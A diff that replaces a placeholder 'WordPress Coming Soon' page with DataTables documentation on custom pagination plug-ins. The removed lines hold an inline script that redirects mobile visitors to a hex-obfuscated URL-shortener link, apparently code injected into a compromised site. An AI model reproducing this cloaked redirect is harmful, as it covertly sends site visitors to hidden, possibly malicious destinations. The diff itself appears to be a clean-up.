@@ -1,41 +1,33 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <title>Coming Soon</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f6fc;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            color: #21759b;
-        }
-        h1 {
-            font-size: 7em;
-            margin: 0;
-        }
-        p {
-            font-size: 1.5em;
-            margin-top: 0.5em;
-        }
-    </style>
-</head>
-<body>
-    <div>
-        <h1>WordPress</h1>
-        <p><b>Coming Soon</b></p>
-    </div>
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            if (/Mobi|Android|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-                window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
-            }
-        });
-    </script>
-</body>
-</html>
+
+<h2>Custom pagination types</h2>
+
+<p>The style of the pagination options that Datatables presents to the end-user can greatly effect the look and feel of your table, as well as, of course, the interaction behaviour. Through the plug-in options you can define your own paging function to create the interaction that you are looking for.</p>
+
+<ul>
+	<li><a href="#how_to">How to use DataTables plug-in pagination functions</a></li>
+	<li><a href="#functions">Plug-in pagination functions</a></li>
+</ul>
+
+
+<a name="how_to"></a>
+<h3>How to use DataTables plug-in pagination functions</h3>
+
+<p>To use a pagination plug-in, you must include the pagination plug-in code from the plug-ins available below, after you load the DataTables library, but before you initialise the DataTable. When initialising the DataTable, you must also tell it to make use of this plug-in, rather than using the default built-in types, by setting the 'sPaginationType' to the value required by the plug-in. As an example the code below makes use of the <a href="#scrolling">scrolling pagination plug-in</a> saved into a file (<a href="/examples/plug-ins/paging_plugin.html">live example</a>):</p>
+
+<pre class="brush: html">&lt;script type="text/javascript" src="jquery.dataTables.js"&gt;&lt;/script&gt;
+&lt;script type="text/javascript" src="dataTables.scrollingPagination.js"&gt;&lt;/script&gt;
+&lt;script type="text/javascript"&gt;
+	$(document).ready(function() {
+		$('#example').dataTable( {
+			"sPaginationType": "scrolling"
+		} );
+	} );
+&lt;/script&gt;
+</pre>
+
+				
+<a name="functions"></a>
+<h3>Plug-in pagination functions</h3>
+
+
+include(`build.1.inc')
